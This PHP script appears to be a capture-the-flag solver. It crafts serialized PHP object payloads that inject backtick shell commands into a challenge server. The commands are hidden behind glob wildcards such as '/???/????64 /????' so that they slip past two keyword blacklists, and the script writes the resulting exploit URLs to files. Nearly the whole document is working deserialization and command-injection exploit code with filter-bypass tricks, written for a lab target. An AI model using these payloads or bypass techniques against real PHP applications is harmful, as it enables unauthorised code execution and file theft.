<?php
// 新策略：使用echo或print输出，然后exit避免__destruct报错

$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_b)) . '/i';

echo "=== Test 1: echo command output ===\n";
$a = ';$x=`/???/???`;die($x);';
$b = '//';
echo "a: $a\n";
echo "b: $b\n";
echo "a blocked: " . (preg_match($pattern_a, $a) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a) && !preg_match($pattern_b, $b)) {
    $ser = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a) . ':"' . $a . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b) . ':"' . $b . '";}';
    $url = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser);
    echo "URL:\n$url\n\n";
    file_put_contents('url1.txt', $url);
}

echo "=== Test 2: more specific command ===\n";
$a2 = ';$x=`/???/???%20/???`;die($x);';
$b2 = '//';
echo "a: $a2\n";
echo "b: $b2\n";
echo "a blocked: " . (preg_match($pattern_a, $a2) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b2) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a2) && !preg_match($pattern_b, $b2)) {
    $ser2 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a2) . ':"' . $a2 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b2) . ':"' . $b2 . '";}';
    $url2 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser2);
    echo "URL:\n$url2\n\n";
    file_put_contents('url2.txt', $url2);
}

echo "=== Test 3: Use multiple wildcards ===\n";
$a3 = ';$x=`/???/????64%20/????`;die($x);';
$b3 = '//';
echo "a: $a3\n";
echo "b: $b3\n";
echo "a blocked: " . (preg_match($pattern_a, $a3) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b3) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a3) && !preg_match($pattern_b, $b3)) {
    $ser3 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a3) . ':"' . $a3 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b3) . ':"' . $b3 . '";}';
    $url3 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser3);
    echo "URL:\n$url3\n\n";
    file_put_contents('url3.txt', $url3);
}

echo "=== Test 4: nl command (newline) ===\n";
$a4 = ';$x=`/???/n?%20/????`;die($x);';
$b4 = '//';
echo "a: $a4\n";
echo "b: $b4\n";
echo "a blocked: " . (preg_match($pattern_a, $a4) ? "YES (contains n?)" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b4) ? "YES" : "NO") . "\n\n";

echo "=== Test 5: tac (reverse cat) ===\n";
$a5 = ';$x=`/???/???%20/????`;die($x);';
$b5 = '//';
echo "a: $a5\n";
echo "b: $b5\n";
echo "Note: This uses wildcard that should match /bin/tac or /usr/bin commands\n";
echo "a blocked: " . (preg_match($pattern_a, $a5) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b5) ? "YES" : "NO") . "\n\n";
